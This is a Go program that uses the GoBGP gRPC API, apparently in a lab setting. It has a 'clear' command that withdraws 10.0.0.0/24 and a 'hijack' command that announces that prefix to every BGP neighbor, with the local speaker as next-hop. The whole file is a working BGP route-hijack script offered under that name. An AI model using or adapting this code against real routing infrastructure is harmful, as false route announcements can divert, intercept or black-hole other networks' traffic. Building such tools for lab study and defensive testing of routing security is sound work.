package main

import (
	"context"
	"fmt"
	"log"
	"os"

	api "github.com/osrg/gobgp/v3/api"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials/insecure"
	"google.golang.org/protobuf/types/known/anypb"
)

const (
	grpcPort = 50051
)

func addRoute(client api.GobgpApiClient, ctx context.Context, prefix string, prefixLen uint32, nextHop string) error {
	// Create NLRI
	nlri, err := anypb.New(&api.IPAddressPrefix{
		Prefix:    prefix,
		PrefixLen: prefixLen,
	})
	if err != nil {
		return fmt.Errorf("failed to create NLRI: %v", err)
	}

	// Create next-hop attribute
	nextHopAttr, err := anypb.New(&api.NextHopAttribute{
		NextHop: nextHop,
	})
	if err != nil {
		return fmt.Errorf("failed to create next-hop attribute: %v", err)
	}

	// Create origin attribute (IGP)
	origin, err := anypb.New(&api.OriginAttribute{
		Origin: 0, // 0 = IGP, 1 = EGP, 2 = INCOMPLETE
	})
	if err != nil {
		return fmt.Errorf("failed to create origin attribute: %v", err)
	}

	path := &api.Path{
		Family: &api.Family{
			Afi:  api.Family_AFI_IP,
			Safi: api.Family_SAFI_UNICAST,
		},
		Nlri:   nlri,
		Pattrs: []*anypb.Any{origin, nextHopAttr},
	}

	_, err = client.AddPath(ctx, &api.AddPathRequest{
		Path: path,
	})
	if err != nil {
		return fmt.Errorf("failed to add path: %v", err)
	}

	return nil
}

func clearRoutes(client api.GobgpApiClient, ctx context.Context) error {
	// Create NLRI for the route we want to delete
	nlri, err := anypb.New(&api.IPAddressPrefix{
		Prefix:    "10.0.0.0",
		PrefixLen: 24,
	})
	if err != nil {
		return fmt.Errorf("failed to create NLRI: %v", err)
	}

	// Create next-hop attribute
	nextHopAttr, err := anypb.New(&api.NextHopAttribute{
		NextHop: "0.0.0.0",
	})
	if err != nil {
		return fmt.Errorf("failed to create next-hop attribute: %v", err)
	}

	// Create origin attribute
	origin, err := anypb.New(&api.OriginAttribute{
		Origin: 0, // IGP
	})
	if err != nil {
		return fmt.Errorf("failed to create origin attribute: %v", err)
	}

	// Delete the specific route
	_, err = client.DeletePath(ctx, &api.DeletePathRequest{
		Path: &api.Path{
			Family: &api.Family{
				Afi:  api.Family_AFI_IP,
				Safi: api.Family_SAFI_UNICAST,
			},
			Nlri:   nlri,
			Pattrs: []*anypb.Any{origin, nextHopAttr},
		},
	})
	if err != nil {
		return fmt.Errorf("failed to clear route: %v", err)
	}
	return nil
}

func hijackRoutes(client api.GobgpApiClient, ctx context.Context) error {
	// Get BGP neighbors
	stream, err := client.ListPeer(ctx, &api.ListPeerRequest{})
	if err != nil {
		return fmt.Errorf("failed to get neighbors: %v", err)
	}

	fmt.Println("BGP Neighbors:")
	for {
		peer, err := stream.Recv()
		if err != nil {
			break
		}
		fmt.Printf("- Neighbor: %s, AS: %d, State: %s\n",
			peer.Peer.Conf.NeighborAddress,
			peer.Peer.Conf.PeerAsn,
			peer.Peer.State.SessionState)

		// Add a new route using our local address as next-hop
		err = addRoute(client, ctx, "10.0.0.0", 24, peer.Peer.Transport.LocalAddress)
		if err != nil {
			return fmt.Errorf("failed to add route to %s: %v", peer.Peer.Conf.NeighborAddress, err)
		}

		fmt.Println("Route added successfully to ", peer.Peer.Conf.NeighborAddress)
	}
	return nil
}

func main() {
	if len(os.Args) < 2 {
		log.Fatal("Usage: go run main.go <command>\nCommands:\n  clear   - Clear all routes\n  hijack  - Add hijack route")
	}

	// Connect to GoBGP daemon
	conn, err := grpc.Dial(fmt.Sprintf("localhost:%d", grpcPort),
		grpc.WithTransportCredentials(insecure.NewCredentials()))
	if err != nil {
		log.Fatalf("Failed to connect to GoBGP: %v", err)
	}
	defer conn.Close()

	client := api.NewGobgpApiClient(conn)
	ctx := context.Background()

	switch os.Args[1] {
	case "clear":
		if err := clearRoutes(client, ctx); err != nil {
			log.Fatalf("Failed to clear routes: %v", err)
		}
		fmt.Println("Route cleared successfully")

	case "hijack":
		if err := hijackRoutes(client, ctx); err != nil {
			log.Fatalf("Failed to hijack routes: %v", err)
		}

	default:
		log.Fatal("Unknown command. Available commands: clear, hijack")
	}
} 